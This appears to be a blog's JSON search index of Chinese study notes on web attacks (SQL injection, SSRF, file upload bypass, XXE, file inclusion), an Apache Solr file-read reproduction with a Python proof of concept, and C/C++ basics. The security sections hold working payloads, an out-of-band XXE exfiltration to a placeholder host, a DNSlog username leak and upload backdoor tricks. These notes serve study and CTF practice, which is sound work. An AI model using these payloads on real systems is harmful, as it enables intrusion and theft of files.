$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];//8.8.8.8echo $get . &quot;&lt;hr&gt;&quot;;echo $post . &quot;&lt;hr&gt;&quot;;echo $cookie . &quot;&lt;hr&gt;&quot;;echo $request . &quot;&lt;hr&gt;&quot;;echo $host . &quot;&lt;hr&gt;&quot;;echo $user_agent . &quot;&lt;hr&gt;&quot;;echo $ip;\n//Java Spring 不同框架，不同写法method=RequestMethod.GETmethod=RequestMethod.POSTrequest.getParameter(&quot;参数名&quot;);\n#Python Flask 不同框架，不同写法from flask import Flask, request, jsonifyimport requestsapp = Flask(__name__)requests.getrequests.postrequest.args.get(key)request.form.get(key)request.values.get(key)\n 查询方式注入\n盲注就是在注入过程中，获取的数据不能回显至前端页面\n此时我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注\n盲注分为以下三类：\n基于布尔的SQL盲注——逻辑判断\nregexp,like,ascii,left,ord,mid\n基于时间的SQL盲注——延时判断\nif,sleep\n基于报错的SQL盲注——报错回显\nfloor,updatexml,extractvalue\n12种报错注入+万能语句\n\n参考：\nlike &#x27;ro%&#x27;            #判断ro或ro...是否成立regexp &#x27;^test[a-z]&#x27;   #匹配test及test...等if(条件,5,0)           #条件成立，返回5，反之返回0sleep(5)              #SQL语句延时执行5秒mid(a,b,c)            #从位置b开始，截取a字符串的c位substr(a,b,c)         #从位置b开始，截取字符串a的c长度left(database(),1)    #left(a,b)从左侧截取a的前b位length(database())=8  #判断数据库的database()名的长度ord=ascii ascii(x)=97 #判断x的ASCII码是否等于97\n\n基于延时：都不需要?id=1 and if(1=1,sleep(5),0)基于布尔：有数据库输出判断标准?id=1 and length(database())=7基于报错：有数据库报错处理来判断标准?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)\n 复杂注入利用\n\n\n堆叠注入：根据数据库类型决定是否支持多条语句执行\n支持堆叠数据库类型：MySQL、MSSQL、PostSQL等\n\n我们是用mysql_query()接收的SQL语句，而mysql_query()它本身只能执行一句SQL语句，所以就会出错\n把mysql_query()换为mysql_multi_query()就可以执行多条SQL语句查询，但mysql_multi_query()的返回类型是布尔型\n\n堆叠注入详解\n[强网杯2019]随便注\n\n\n二次注入：应用功能逻辑设计上导致的先写入后组合的注入\n\n[网鼎杯2018]Unifinish\n\n\nDnslog注入：解决不回显（反向连接），SQL注入，命令执行，SSRF等\nhttp://www.dnslog.cn\nping %USERNAME%. &lt;生成的链接&gt;#%USERNAME%是获取本地计算机用户名\nhttps://github.com/BugScanTeam/DNSLog\nhttps://dig.pm/\nhttp://ceye.io\n\n\n绕过bypass等\n\n\n黑盒模式分析以上\n二次注入：插入后调用显示操作符合\n堆叠注入：判断注入后直接调多条执行\n\n偏移注入\n解决表名已知，列名未知的情况\nhttp://t.csdnimg.cn/Jzbb1\nhttps://www.cnblogs.com/xishaonian/p/6054320.html\nhttps://www.fujieace.com/penetration-test/access-offset-injection.html\n 伪静态\n\n定义\n\n通常情况下，动态脚本的网站的url类似下面这样：\nhttp://www.test.com/news.php?id=1\n做了伪静态之后就成这样了：\nhttp://www.test.com/news/id/1.html\n\n判断\n\n浏览器控制台输入\njavascript:alert(document.lastModified)\n如果得到的时间和现在时间一致，此页面就是伪静态，反之是真静态\n\n因为动态页面的最后修改时间总是当前时间，而静态页面的最后修改时间则是它生成的时间。\n\n","tags":["小迪"]},{"title":"10通用-CSRF&SSRF","url":"/2024/06/01/10%E9%80%9A%E7%94%A8-CSRF-SSRF/","content":" CSRF&amp;SSRF\n在已有CSRF&amp;SSRF知识上做的一些补充\n CSRF\n\n黑盒如何判断：\n\n\n\n看来源（同源策略）\n\nReferer头\n\n如果直接访问目标网址访问成功，即来源为空，则没有同源策略\n\n\n看凭据有无token\n\n\n看关键操作有无验证\n\n\n\n\n白盒审计：\n直接复现有没有\n成功→有漏洞\n失败→代码→缺陷过滤（绕过）→有漏洞\n失败→代码→完整过滤→没有漏洞\n\n\n SSRF\n\n可能出现的地方\n\n\n\n社交分享功能：获取超链接的标题等内容进行显示\n\n\n转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览\n\n\n在线翻译：给网址翻译对应网页的内容\n\n\n图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片\n\n\n图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用户体验\n\n\n云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可进行SSRF测试\n\n\n网站采集、网站抓取的地方：一些网站会针对你输入的URL进行一些信息采集工作\n\n\n数据库内置功能：数据库的比如MongoDB的copyDatabase函数\n\n\n邮件系统：比如接收邮件服务器地址\n\n\n编码处理、属性信息处理、文件处理：比如ffmpeg、ImageMagick、docx、PDF、xml处理器等\n\n\n未公开的api实现以及其他拓展调用URL的功能：可以利用Google语法加上这些关键字取寻找SSRF漏洞\n一些URL中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain……\n\n\n从远程服务器请求资源（upload from url如discuz！；import &amp; expost rss feed如web blog；使用了xml引擎对象的地方，如wordpress xmlrpc.php）\n\n\n参考文章\n\n搭配Metasploit打内网\n\n\nSSRF可能出现的地方：\n功能点抓包指向代码块审计\n功能点函数定位代码块审计\n\n\n修复：\n\n\n\n禁用跳转\n禁用不需要的协议\n固定或限制资源地址\n错误信息统一信息处理\n\n","tags":["小迪"]},{"title":"08通用-文件上传","url":"/2024/05/01/08%E9%80%9A%E7%94%A8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","content":" 文件上传\n在已有文件上传知识上做的一些补充\nUpload-labs通关手册\n\n.htaccess文件\n\n或者”分布式配置文件“，全称是Hypertext Access（超文本入口）。提供了针对目录改变配置的方法，即在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。\n启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config，则可以在服务器配置文件中按以下方法配置：AccessFileName.config。\n它里面有这样一段代码：AllowOverride None，把None改成All\n常见的配法有以下几种：\nSethandler application/x-httpd-phpAddHandler php5-script .jpgAddType application/x-httpd-php .jpg\nSethandler将该目录及子目录的所有文件均映射为php文件类型\nAddhandler使用php5-script处理器来解析所匹配到的文件\nAddType将特定拓展名文件映射php文件类型\n\n举例：\n&lt;FilesMatch &quot;jpeg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;\n他会将后缀名为jpg的文件当作php文件解析\n或者.htaccess写成\nAddType application/x-httpd-php jpg\n以php解析.htaccess文件所在目录及其子目录中的后缀为.xxx的文件\n\n\n.user.ini\n\nphp的配置文件，.user.ini中的字段也会被php视为配置文件来处理，从而导致php的文件解析漏洞。但是想要引发.user.ini解析漏洞需要三个前提条件\n\n服务器脚本语言为PHP\n服务器使用CGI/FastCGI模式\n上传目录下要有可执行的php文件\n\n创建一个.user.ini文件\nauto_prepend_file=shell.jpg\n意思是：所有的php文件都自动包含mm.jpg文件\n\n执行运算符\n\nPHP将尝试将反引号中的内容作为shell命令来执行，使用反引号运算符的效果与函数shell_exec()相同\n&lt;?=`tac ../f*`?&gt;\n\n补充\n\n\n绕过姿势\n\n&lt;script language=&quot;php&quot;&gt;echo&#x27;1&#x27;;&lt;/script&gt;\n\n先访问一个地址，UA头改为后门代码，后门代码就会进入到日志里面，再利用.user.ini包含日志文件来触发访问UA头里的后门代码\n\n&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access/lo&quot;.&quot;g&quot;?&gt;\n\n\n.user.ini包含远程png\npng include带有后门代码的远程地址\n\nIP转数字\n在浏览器中访问http://192.168.1.1与 http://3232235777是相同的效果\n\n.user.ini：auto_prepend_file=pngpng：&lt;?=include&#x27;http://3232235777&#x27;&gt;\n\n\n条件竞争\n遇到文件删除时有两种情况\n\n\n什么都删除\n上传成功后，没有删除之前，文件会在这个时间段存活，然后代码立马删掉，这个时间点文件确实是上传成功了，只是快速的让你看不到而已，所以我们就在没有上传之前就不断发包，一直访问地址，当文件被创建后，就触发代码，让它创建一个文件\n\n\n后门代码删除\n\n\n条件竞争：在上传成功，立马访问，创建新代码（代码被执行后重新新建一个文件）\n\n\n二次渲染\n把上传的图像进行了加工，手工注入需要把后门代码写到共同体中去\n文件上传之二次渲染绕过\n\n二次渲染判定\n\n判断上传前后大小及内容\n判断上传后的文件返回数据包\n\n\n\n\nctfshow Web164中满足了PHP文件引入图片\nxxx.php?image=yyy.png\n假如是类似于upload/yyy.png，图片中即使带有后门代码也不能被调用，还需上传.user.ini\n\n如果是JPG，访问返回包，发现gd-jpeg v1.0 (using IJG JPEG v80)，即调用PHP内置的库来处理JPG进行二次渲染\n\n\n\nPHP一句话木马，后缀.php→上传成功，直接利用\n后缀是.jpg图片文件，无法直接利用\n后缀是.jpg图片文件+文件包含→上传成功，直接利用\n\n中间件解析&amp;编辑器安全\nIIS和Apache漏洞举例前文已提，此处不再赘述\nNginx文件名逻辑漏洞\nVulhub\nVulnhub\n\n黑盒\n\n寻找一切存在文件上传的功能应用\n\n个人用户中心是否存在文件上传功能\n后台管理系统是否存在文件上传功能\n字典目录扫描探针文件上传构造地址\n字典目录扫描探针编辑器目录构造地址\n\n\n白盒\n\n看三点：中间件、编辑器、功能代码\n\n中间件直接看语言环境常见搭配\n编辑器直接看目录结构或搜索关键字\n功能代码直接看源码应用或搜索关键字\n\n","tags":["小迪"]},{"title":"11通用-XXE","url":"/2024/06/03/11%E9%80%9A%E7%94%A8-XXE/","content":" XXE\n在已有XXE知识上做的一些补充\n请求包会存在如下类似字样\nAccept: application/xmlContent-Type: application/xmlX-Requested-With: XMLHttpRequest\n例题\npayload:\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [\t&lt;!ENTITY f SYSTEM &quot;file:///home/ctf/flag.txt&quot;&gt;]&gt;&lt;x&gt;&amp;f;&lt;/x&gt;\n同时修改Content-Type为application/xml\n参考文章\n\nXXE黑盒发现\n\n\n获取得到Content-Type或数据类型为XML时，尝试进行XML语言payload进行测试\n不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试XXE\nXXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE payload被执行\n\n\nXXE白盒发现\n\n\n可通过应用功能追踪代码定位审计\n可通过脚本特定函数搜索定位审计\n可通过伪协议玩法绕过相关修复等\n\n\n无回显时要利用远程进行回显\n\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[    &lt;!ENTITY % file SYSTEM &quot;file:///d:/1.txt&quot;&gt;    &lt;!--执行的时候用file接收读到的内容--&gt;    &lt;!ENTITY % remoete SYSTEM &quot;http://x.x.x.x/test.dtd&quot;&gt;    &lt;!--请求远程的dtd文件--&gt;    %remote;    %all;    ]&gt;&lt;root&gt;&amp;send;&lt;/root&gt;\n其中远程的test.dtd内容如下\n&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://x.x.x.x/get.php?file=%file;&#x27;&gt;&quot;&gt;\n\nXXE修复防御方案\n\n\n禁用外部实体\n\nPHP：\nlibxml_disable_entity_loader(true);\nJava：\nDocumentBuilderFactory dbf=DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);\nPython：\nfrom lxml import etreexmlData =etree.parse(xmlSource.etree.XMLParser(resolve_entities=False))\n\n过滤用户提交的XML数据\n\n过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC\n","tags":["小迪"]},{"title":"Apache Solr任意文件读取漏洞","url":"/2024/09/03/Apache-Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","content":" Apache Solr任意文件读取漏洞\nApache Solr存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标服务器敏感文件\n主要原因：由于未开启身份验证，导致未经身份验证的攻击者可利用Config API打开requestDispatcher.requestParsers.enableRemoteStreaming开关，从而使攻击者可以在未授权的情况下获取目标服务器敏感文件。\n影响版本：Apache Solr &lt;= 8.8.1\nfofa语法：\napp=&quot;Apache-Solr&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; status_code=&quot;200&quot;\n 漏洞复现\nSolr下载地址，安装配置过程不再赘述\n\n这里的core核心可以理解为数据库，里面的cocument可以理解为表\n\nSolr自带开源Servlet容器Jetty，当然可以用Tomcat，这里使用自带的Jetty\n\n\n获取core信息\n\nhttp://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&amp;wt=json\n\n\n依据core_name构造config包\n\nPOST /solr/demo/config HTTP/1.1Host: 192.168.45.1:8983Content-Length: 82Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http:/ip:89833Content-Type: application/jsonUser-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0 Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.45.1:8983/solr/demo/configAccept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close&#123;&quot;set-property&quot;:&#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;\n返回包\nHTTP/1.1 200 OKConnection: closeContent-Type: text/plain;charset=utf-8Content-Length: 149&#123;\t&quot;responseHeader&quot;:&#123;\t\t&quot;status&quot;:[]\t\t&quot;QTime&quot;:256&#125;,    &quot;WARNING&quot;:&quot;This response format is experimental.  It is likely to change in the future.&quot;&#125;\n状态包以及响应内容**“This response format is experimental.  It is likely to change in the future.”**表示存在漏洞\n\n读取文件/etc/passwd\n\nPOST /solr/demo/./debug/dump?param=ContentStreams HTTP/1.1Host: 192.168.45.1:8983Content-Length: 31Cache-Control: max-age=0Upgrade-Insecure-Requests: 1 Origin: http:/192.168.45.1:89833 Content-Type: application/x-www-form-urlencoden User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0 Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.45.1:8983/solr/demo/configAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6Connection: closestream.url=file:///etc/passwd\n拿到数据\n 构建POC\n\n构建poc的基础操作\n\n利用开源的POC框架，也可以自己写框架（建议使用poc框架）\n熟悉漏洞原理\n搭建漏洞靶场环境\n选择编程语言（常用python）\n\n\n常用python库：\nurllib2: 发送HTTP/HTTPS请求\nrequests:更“高级”的urllib2库\nre：正则表达式\nrandom：生成随机数\nbase64：base64编码\nhashlib:常用来计算md5值\ntime：用来统计访问时间延迟\n\n\n# -*- coding: utf-8 -*-import requestsimport sysimport randomimport reimport base64import timeimport json\n\n获取core的信息\n\n#拼接url然后提取name值def get_core_name(target_url):    core_url = target_url + &quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot;    reqs = requests.get(url=core_url,timeout=10)    try:        core_name = list(json.loads(reqs.text)[&quot;status&quot;])[0]        return core_name    except:        # print (&quot;无法提取&quot;)        sys.exit()\n\n依据core_name构造config包\n\n#构造config包def enable_remote_streaming(target_url,core_name):    session = requests.session()    vuln_url = target_url + &quot;/solr/&quot; + core_name + &quot;/config&quot;    headers = &#123;&quot;Content-type&quot;: &quot;application/json&quot;&#125;    data = &#x27;&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27;    reqs = session.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)    if &quot;responseHeader&quot; in reqs.text and reqs.status_code == 200:        print (&quot;存在漏洞&quot;)        return True    else:        print (&quot;不存在漏洞&quot;)        return False\n\n读取文件/etc/passwd\n\n#构造查看/etc/passwd的包def read_etc_passwd(target_url,core_name):    session = requests.session()    vuln_url = target_url + &quot;/solr/&#123;&#125;/debug/dump?param=ContentStreams&quot;.format(core_name)    headers = &#123;&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125;    reqs = session.post(url=vuln_url,headers=headers)    if reqs.status_code == 200:        print (&quot;读取成功&quot;)        print (reqs.text)    else:        return False\n\n执行并输出\n\ndef main(target_url):    core_name = get_core_name(target_url)    if core_name:        if enable_remote_streaming(target_url,core_name):            read_etc_passwd(target_url,core_name)if __name__ == &quot;__main__&quot;:    TARGET_URL = &quot;http://ip:8983&quot;    main(TARGET_URL)\n参考文章：https://mp.weixin.qq.com/s/ycXsYc7ZYc22o-8Q5ALBYQ\n","tags":["Cyber Security"]},{"title":"12通用-文件包含","url":"/2024/06/03/12%E9%80%9A%E7%94%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","content":" 文件包含\n在已有文件包含知识上做的一些补充\nsession包含\n利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含（ctfshow web82-86）\n其中，当代码类似如下时\ninclude(&#x27;conn/&#x27;.$file.&#x27;.php&#x27;);\n无法利用伪协议\n小结：\n\n可以通过文件上传获取，上传的文件在服务器上\n没有文件上传，借助日志写入（UA）、session文件写入\n伪协议没有上传文件也能进行PHP代码执行、读文件、写文件（编码算法的转换）\n\n","tags":["小迪"]},{"title":"C语言","url":"/2023/03/12/C%E8%AF%AD%E8%A8%80/","content":"程序设计入门——C语言\nC语言程序设计进阶\n\n 优先级\n赋值运算符&lt;条件运算符&lt;关系运算符&lt;算术运算符\n\n\n\n优先级\n运算符\n结合性\n\n\n\n\n1\n()\n从左到右\n\n\n2\n! + - ++ –\n从右到左单目的+和-\n\n\n3\n* / %\n从左到右\n\n\n4\n+ -\n从左到右\n\n\n5\n&lt; &lt;= &gt; &gt;=\n从左到右\n\n\n6\n== !=\n从左到右\n\n\n7\n&amp;&amp;\n从左到右\n\n\n8\n||\n从左到右\n\n\n9\n= += -= *= /= %=\n从右到左\n\n\n\n不要把赋值、包括复合赋值组合进表达式\n 分支结构\nswitch-case\nswitch(表达式)&#123;    case 常量:                break;    default:        &#125;\n\n\nbreak：跳出循环\n\n\ncontinue：跳过循环这一轮剩下的语句进入下一轮\n\n\ngoto：多重循环的内层跳到最外面的时候（但是少用）\n\n\n\tgoto out;\t···out:\treturn 0;\n 循环\nwhile语句是一个循环语句，它会首先判断一个条件是否满足，如果条件满足，则执行后面紧跟着的语句或语句括号，然后再次判断条件是否满足，如果条件满足则再次执行，直到条件不满足为止。后面紧跟的语句或语句括号，就是循环体。\n\ndo-while循环和while循环很像，唯一的区别是我们在循环体执行结束的时候才来判断条件。也就是说，无论如何，循环都会执行至少一遍，然后再来判断条件。与while循环相同的是，条件满足时执行循环，条件不满足时结束循环。\n 布尔运算\n#include &lt;stdbool.h&gt;\n之后就可以使用bool和true、false\n#include &lt;stdbool.h&gt;bool b=6&gt;5;bool c=true;printf(&quot;%d\\n&quot;,b);\n 数组\nint number[100];int a[]=&#123;1,4,5,63,27,8,6,2,9,8,23,7&#125;\n数组变量本身表达地址，所以\n\nint a[10];int *p=a;//无需用&amp;取地址\n\n但是数组的单元表达的是变量，需要用&amp;取地址\n\na==&amp;a[0]\n\n[]运算符可以对数组做，也可以对指针做：\n\np[0]&lt;==&gt;a[0]\n\n*运算符可以对指针做，也可以对数组做：\n\n*a=25;\n\n数组变量是const的指针，不能被赋值\n\nint a[]&lt;==&gt;int * const a=\n\n\n&gt;int i&gt;const int* p1=&amp;i;&gt;int const* p2=&amp;i;&gt;int *const p3=&amp;i;\n判断哪个被const了的标志是const在*的前面还是后面\n\n\n格式控制符的形式\n\n%、[-]、[0]、[m/m.n]、[l/h]格式控制符\n其中[ ]里面的内容是可选的\n\n\n-：表示左对齐，缺省情况下为右对齐（若没规定输出数据的宽度则为左对齐）。\n\n\n0：当规定输出数据的宽度时，所输出数据实际的宽度小于规定的宽度，则在左边用“0”补齐。\n\n\nm/m.n：m规定了输出数据的宽度（位数），若数据实际的宽度大于m，则突破m的限制全部输出，反之将数据全部输出之后用空格进行左补齐；对于实数n是指小数点后的位数，若n小于小数点后实际的位数，则按四舍五入原则进行截取；对于字符串，n表示从左至右截取的字符个数。\n\n\nl/h：l表示长整型数据（可用于%ld、%lo、%lx、%lu）以及double型数据（%lf或%le）；h表示短整型数据（可用于%hd、%ho、%hx）。\n\n\n\n格式控制符及其功能（以输出为例）\n\n\n%d：用来输出有符号的十进制整数（包括char类型）\n%u：用来输出无符号的十进制整数（包括char类型）\n%o：用来输出无符号的八进制整数（比如输出*p的值（*p指向a则输出a的地址））\n%x：用来输出无符号的十六进制整数\n%c：用来输出单个字符\n%s：用来输出一个字符串（%和s之间加数字控制只读这么多数字）\n%f：用来输出小数形式的十进制浮点数（输入时小数形式和指数形式都可以识别）\n%e：用来输出指数形式的十进制浮点数（输入时小数形式和指数形式都可以识别）\n%g：用来输出指数形式和小数形式两者中较短的十进制浮点数（输入时小数形式和指数形式都可以识别）\n%p：用来输出值的地址\n\n 字符串函数\n#include &lt;string.h&gt;\n\n\nstrlen(字符数组)：返回字符串的长度（不包括结尾的\\0）\n\n\nstrcmp(str1,str2)：按ASCII码值大小比较两个字符串，出现不相同的字符以第一对不相同的字符比较结果为准并返回：\n\n0：s1==s2\n正整数：s1&gt;s2\n负整数：s1&lt;s2\n\n\n\nstrcpy(str1,str2)：把后者的字符串覆写拷贝到前者\nstrncpy(str1,str2,n)：将str2的前n个字符复制到str1中。\n\n\nstrcat(str1,str2)：把后者的字符串拷贝到前者的后面，接成一个长的字符串\n\n\nstrchr：在一个字符串中查找给定字符的第一个匹配之处，返回null表示没找到\n\n\nstrstr：判断字符串后者是否是前者的子串。如是则返回前者字符串从后者第一次出现的位置开始到结尾，否则返回null\n\n\nstrlwr(字符串)：将字符串中的大写字母换成小写字母\n\n\nstrupr(字符串)：将字符串中的小写字母换成大写字母\n\n\n 变量的存储方式和生存期\n存储空间分为三部分：\n\n\n程序区\n\n\n静态存储区\n\n全局变量\n\n\n\n动态存储区\n\n函数形参：在调用函数时给形参分配存储空间\n函数中定义的没有用关键字static声明的变量（自动变量）\n函数调用时的现场保护和返回地址等\n\n\n\n 局部变量的存储类别\n\n自动变量（auto变量）\n\n(auto) int a=0;\n\n寄存器变量（register变量）（现在用register声明变量的必要性不大）\n\n为提高使用效率将使用频繁的局部变量值放在CPU的寄存器中\nregister int a;\n\n全局变量的存储类别\n\n全局变量的作用域有以下几种情况：\n\n在一个文件内拓展外部变量的作用域\n\n用extern作外部变量声明，表示该外部变量的作用域拓展到此位置（但是提倡将外部变量的定义放在引用它的所有函数前，可避免在函数中多加一个extern声明）\n#include&lt;stdio.h&gt;int main()&#123;    int max();//因AB是外部变量，所以调用max时用不到参数传递    extern int A,B;    printf(&quot;max is %d&quot;,max());&#125;int A,B;int max()&#123;    return (A&gt;B?A:B)&#125;\n\n\n将外部变量的作用域拓展到其他文件\n\n\n将外部变量的作用域限制在本文件中\n\n\n某些外部变量只限于被本文件引用，而不能被其他文件引用，这时可在定义外部变量时加一个static声明\n 动态内存分配\n#include &lt;stdlib.h&gt;\n\nmalloc(size)：在内存的动态存储区中分配一个长度为size字节的连续空间（用完要free）\ncalloc(n,size)：分配n个长度为size的连续空间（保存数组时常用）\nrealloc(p,size)：将p所指向的动态空间大小改为size，p值不变\nfree(p)：释放动态存储区\n\n 内部函数&amp;外部函数\n\n内部函数\n\n一个只能被本文件中其他函数所调用的函数，在定义内部函数时在函数名和函数类型前加static\n\n外部函数\n\n可供其他文件调用的函数，在函数首部的最左端加关键字extern（定义函数时省略extern则默认为是外部函数）\n 指针\nint a=1,b=2;int *p1=&amp;a;int *p2;p2=&amp;b;\n*（arr+i）和arr[i]无条件等价\n\n\n\n实参类型\n要求形参的类型\n传递的信息\n通过函数调用能否改变实参的值\n\n\n\n\n变量名\n变量名\n变量的值\n不能\n\n\n数组名\n数组名或指针变量\n实参数组首元素的地址\n能\n\n\n\n\n通过指针引用数组\n\n\n如果用指针变量作实参，必须先使指针变量有确定值，指向一个已定义的对象。\n\n通过指针引用字符串：\nchar *str=&quot;hello&quot;;\n指向函数的指针\nint (*p)(int);//不可省略*p两边的括号！\n指针变量的类型及含义\n\n 结构体\nstruct 结构体名&#123;    ...&#125;;struct Example eg1,eg2;\n 枚举\nenum 枚举类型名字{名字0,…,名字n};\n\n声明枚举量也可以指定值\n\n和数组不同，结构变量的名字并不是结构变量的地址，必须使用&amp;运算符\n 文件读写\nfopen(文件名，使用文件方式);\nfopen(&quot;a1&quot;,&quot;r&quot;);\n使用文件方式\n\n常用下面方法打开一个文件\nif((fp=open(&quot;file1&quot;,&quot;r&quot;))==NULL)&#123;    printf(&quot;can&#x27;t open file\\n&quot;);    exit(0);&#125;\nfclose关闭数据文件\n读写一个字符的函数\n\n读写一个字符串的函数\n\n 易混淆\n\n\n\n表达式\n值\n\n\n\n\na++\na原来的值\n\n\n++a\na+1以后的值\n\n\na–\na原来的值\n\n\n–a\na-1以后的值\n\n\n\n++a：先加再用\na++：先用再加\n 杂项\n\n随机数的生成\n\n#include &lt;stdlib.h&gt;#include &lt;time.h&gt;srand(time(0));int num=rand();\n","tags":["技术栈"]},{"title":"C++","url":"/2023/05/05/C++/","content":"黑马|C++\n 字符\n 字符型\nchar ch=&#x27;a&#x27;\n 字符串\nC风格：\nchar str[]=&quot;hello&quot;\nC++风格：\n#include &lt;string&gt;string str=&quot;hello&quot;\n ※分文件编写\n\n创建后缀名为.h的头文件\n创建后缀名为.cpp的源文件\n头文件中写函数的声明\n源文件中写函数的定义\n\n//swap.h头文件#include&lt;iostream&gt;using namespace std;//函数声明void swap(int a , int b);\n//swap.cpp文件#include&quot;swap.h&quot;void swap(int a , int b)&#123;\t...&#125;\n//main.cpp文件#include&quot;swap.h&quot;int main()&#123;\t...&#125;\n 指针\n在32位操作系统下占用4个字节，64位下占用8个字节（和数据类型无关！）\n 空指针\n指针变量指向内存中编号为0的空间\n\n用途：初始化指针变量\n注意：空指针指向的内存不可访问！\n\nint * p = NULL;\n内存编号为0~255为系统占用内存，不允许用户访问\n 野指针\n指针变量指向非法的内存空间\nint * p = (int *)0×1100;\n const修饰指针\n三种情况：\nint a=10;int b=10;\n\n修饰指针—常量指针\n\n特点：指针指向可修改，但指针指向的值不可修改\nconst int *p=&amp;a;\n*p=20;//×*p=&amp;b;//√（指向可以改）\n\n修饰常量—指针常量（常指针）\n\n特点：指针指向不可修改，指向的值可修改\nint * const p=&amp;a;\n*p=20;//√*p=&amp;b;//×\n\n既修饰指针，又修饰常量\n\n特点：指针指向和指向的值都不可修改\nconst int * const p=&amp;a;\n*p=20;//×*p=&amp;b;//×\n\n技巧：看const右侧紧跟着的是指针还是常量，是指针就是常量指针，是常量就是指针常量\n\n 结构体\n用户自定义的数据类型，允许存储不同的数据类型\n 定义&amp;使用\n语法：struct 结构体名 { 结构体成员列表 };\n通过结构体创建变量的三种方式：\n\nstruct 结构体名 变量名\nstruct 结构体名 变量名={成员1值，成员2值…}\n定义结构体时顺便创建变量\n\n\n定义结构体变量时关键字struct不可省略\n创建结构体变量时关键字struct可省略\n\nstruct student &#123; ... &#125;int main()&#123;    (struct) student stu1=&#123; ... &#125;;&#125;\n 结构体数组\n将自定义的结构体放到数组中，方便维护\n语法：struct 结构体名 数组名[元素个数]={ {}，{}，… {}}\nstruct student arr[3]=&#123;    &#123;&quot;张三&quot;，18,80&#125;,    &#123; ... &#125;,    &#123; ... &#125;&#125;\n给数组中的元素赋值\narr[2].name=&quot;赵六&quot;;\n 结构体指针\n通过指针访问结构体中的成员\n\n利用操作符-&gt;可以通过结构体指针访问结构体属性\n\nstruct student s=&#123; &#125;;struct *p=&amp;s;cout&lt;&lt;&quot;姓名：&quot;&lt;&lt;p-&gt;name&lt;&lt;endl;\n 内存分区模型\n\nC++中在程序运行前分为全局区和代码区\n代码区的特点是共享和只读\n全局区中存放全局变量、静态变量、常量\n常量区中存放const修饰的全局常量和字符串常量\n\n new\n在堆区创建整形数据\nnew返回的是该数据类型的指针\n 引用\n语法：数据类型 &amp;别名 = 原名\n\n注意事项：\n\n引用必须初始化，且初始化后不可改变\n\n\n 引用做函数参数\n作用：函数传参时可利用引用的技术让形参修饰实参\n优点：简化指针修改实参\n//三种交换值方法：值传递、地址传递、引用传递void swap(int &amp;a,int &amp;b)&#123;    int temp=a;    a=b;    b=temp;&#125;int main()&#123;    int a=10;    int b=20;    swap(a,b);    cout&lt;&lt;&quot;a:&quot;&lt;&lt;a&lt;&lt;&quot;b:&quot;&lt;&lt;b&lt;&lt;endl;    return 0;&#125;//a=20,b=10\n\n通过引用参数产生的效果同地址传递是一样的。引用语法更清楚简单。\n\n *引用做函数返回值\n引用可作为函数的返回值存在\n不要返回局部变量的引用\n函数的调用可作为左值\nint&amp; test()&#123;    static int a=10;    return a;&#125;int main()&#123;    int &amp;ref=test();    cout&lt;&lt;&quot;ref:&quot;&lt;&lt;ref&lt;&lt;endl;    test()=100    cout&lt;&lt;&quot;赋值后ref:&quot;&lt;&lt;ref&lt;&lt;endl;&#125;//ref=10//ref=100\n如果函数的返回值是引用，这个函数调用可作为左值\n 函数\n 函数默认参数\nC++中函数才形参列表中形参是可以有默认值的\n语法：返回值类型 